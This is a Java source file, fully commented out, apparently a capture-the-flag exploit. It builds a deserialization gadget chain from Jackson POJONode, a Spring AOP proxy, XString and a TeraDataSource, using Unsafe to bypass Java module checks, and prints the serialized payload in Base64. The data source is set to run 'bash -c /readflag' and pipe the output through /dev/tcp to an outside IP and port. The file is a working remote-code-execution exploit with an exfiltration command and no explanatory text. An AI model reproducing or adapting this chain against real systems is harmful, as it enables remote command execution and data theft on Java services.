//package gadget.timu;
//
//import com.fasterxml.jackson.databind.node.POJONode;
//import com.teradata.jdbc.TeraDataSource;
//import javassist.*;
//import org.dubhe.javolution.pool.PalDataSource;
//import org.springframework.aop.framework.AdvisedSupport;
//
//import javax.sql.DataSource;
//import java.io.*;
//import java.lang.reflect.*;
//import java.nio.file.Files;
//import java.nio.file.Paths;
//import java.util.ArrayList;
//import java.util.Base64;
//import java.util.HashMap;
//import java.util.PriorityQueue;
//
//import org.springframework.aop.target.HotSwappableTargetSource;
//import sun.misc.Unsafe;
//
////
//public class JacksonTera
//{
//    public static void main(String[] args) throws Exception {
////        com.sun.org.apache.xpath.internal.objects.XString
//        // --add-opens java.xml/com.sun.org.apache.xpath.internal=ALL-UNNAMED
//        final ArrayList<Class> classes = new ArrayList<>();
//        CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
//        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
//        ctClass.removeMethod(writeReplace);
//        // 将修改后的CtClass加载至当前线程的上下文类加载器中
//        ctClass.toClass();
//        classes.add(Class.forName("java.lang.reflect.Field"));
//        classes.add(Class.forName("java.lang.reflect.Method"));
//        classes.add(Class.forName("java.util.HashMap"));
//        classes.add(Class.forName("java.util.Properties"));
//        classes.add(Class.forName("java.util.PriorityQueue"));
//        classes.add(Class.forName("com.teradata.jdbc.TeraDataSource"));
//        classes.add(Class.forName("javax.management.BadAttributeValueExpException"));
//        classes.add(Class.forName("com.sun.org.apache.xpath.internal.objects.XString"));
//        classes.add(Class.forName("java.util.HashMap$Node"));
//        classes.add(Class.forName("com.fasterxml.jackson.databind.node.POJONode"));
////        classes.add(Class.forName("java.xml.*"));
//
//        new JacksonTera().bypassModule(classes);
//
//
//        TeraDataSource dataSource = new PalDataSource();
//        dataSource.setBROWSER("bash -c /readflag>&/dev/tcp/8.134.216.221/7777");
//        dataSource.setLOGMECH("BROWSER");
//        dataSource.setDSName("8.134.216.221");
//        dataSource.setDbsPort("10250");
//
//        Class unsafeClass = Class.forName("sun.misc.Unsafe");
//        Field field = unsafeClass.getDeclaredField("theUnsafe");
//        field.setAccessible(true);
//        Unsafe unsafe = (Unsafe) field.get(null);
//        Module baseModule = dataSource.getClass().getModule();
//        Class currentClass = PriorityQueue.class;
//        long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
//        unsafe.putObject(currentClass, offset, baseModule);
//
//        Class<?> clazz =
//                Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
//        Constructor<?> cons = clazz.getDeclaredConstructor(AdvisedSupport.class);
//        cons.setAccessible(true);
//        AdvisedSupport advisedSupport = new AdvisedSupport();
//        advisedSupport.setTarget(dataSource);
//        InvocationHandler handler = (InvocationHandler)
//                cons.newInstance(advisedSupport);
//        Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]
//                {DataSource.class}, handler);
//        POJONode pojoNode = new POJONode(proxyObj);
//
////        POJONode pojoNode = new POJONode(dataSource);
////        pojoNode.toString();
//
//        // com.sun.org.apache.xpath.internal.objects
//        Class cls = Class.forName("com.sun.org.apache.xpath.internal.objects.XString");
//        Constructor constructor = cls.getDeclaredConstructor(String.class);
//        constructor.setAccessible(true);
//        Object xString = constructor.newInstance("1");
//
//        HashMap hashMap = makeMap(xString,pojoNode);
//
//        serialize(hashMap);
////        unserialize("ser.bin");
//
//    }
//    public static HashMap<Object, Object> makeMap (Object obj1, Object obj2) throws Exception {
//        HotSwappableTargetSource v1 = new HotSwappableTargetSource(obj2);
//        HotSwappableTargetSource v2 = new HotSwappableTargetSource(obj1);
//
//        HashMap<Object, Object> s = new HashMap<>();
//        setFiledValue(s, "size", 2);
//        Class<?> nodeC;
//        try {
//            nodeC = Class.forName("java.util.HashMap$Node");
//        }
//        catch (ClassNotFoundException e) {
//            nodeC = Class.forName("java.util.HashMap$Entry");
//        }
//        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
//        nodeCons.setAccessible(true);
//
//        Object tbl = Array.newInstance(nodeC, 2);
//        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
//        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
//        setFiledValue(s, "table", tbl);
//
//        return s;
//    }
//    public static void setFiledValue(Object obj, String key, Object val) throws Exception {
//        Field field ;
//        try{
//            field = obj.getClass().getDeclaredField(key);
//        }catch(Exception e){
//            if (obj.getClass().getSuperclass() != null)
//                field = obj.getClass().getSuperclass().getDeclaredField(key);
//            else {
//                return;
//            }
//        }
//        field.setAccessible(true);
//        field.set(obj,val);
//    }
//    public static void serialize(Object obj) throws IOException {
//        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
//        ObjectOutputStream oos = new ObjectOutputStream(byteArrayOutputStream);
//        oos.writeObject(obj);
//        byte[] bytes = byteArrayOutputStream.toByteArray();
//        System.out.println(Base64.getEncoder().encodeToString(bytes));
//
//    }
//    public static void unserialize(String Filename) throws IOException, ClassNotFoundException {
//        ObjectInputStream ois = new ObjectInputStream(Files.newInputStream(Paths.get(Filename)));
//        Object obj = ois.readObject();
//    }
//
//    public void bypassModule(ArrayList<Class> classes){
//        try {
//            Unsafe unsafe = getUnsafe();
//            Class currentClass = this.getClass();
//            try {
//                Method getModuleMethod = getMethod(Class.class, "getModule", new Class[0]);
//                if (getModuleMethod != null) {
//                    for (Class aClass : classes) {
//                        Object targetModule = getModuleMethod.invoke(aClass, new Object[]{});
//                        unsafe.getAndSetObject(currentClass, unsafe.objectFieldOffset(Class.class.getDeclaredField("module")), targetModule);
//                    }
//                }
//            }catch (Exception e) {
//            }
//        }catch (Exception e){
//            e.printStackTrace();
//        }
//    }
//
//    private static Method getMethod(Class clazz, String methodName, Class[] params) {
//        Method method = null;
//        while (clazz!=null){
//            try {
//                method = clazz.getDeclaredMethod(methodName,params);
//                break;
//            }catch (NoSuchMethodException e){
//                clazz = clazz.getSuperclass();
//            }
//        }
//        return method;
//    }
//    private static Unsafe getUnsafe() {
//        Unsafe unsafe = null;
//        try {
//            Field field = Unsafe.class.getDeclaredField("theUnsafe");
//            field.setAccessible(true);
//            unsafe = (Unsafe) field.get(null);
//        } catch (Exception e) {
//            throw new AssertionError(e);
//        }
//        return unsafe;
//    }
//}
//
//
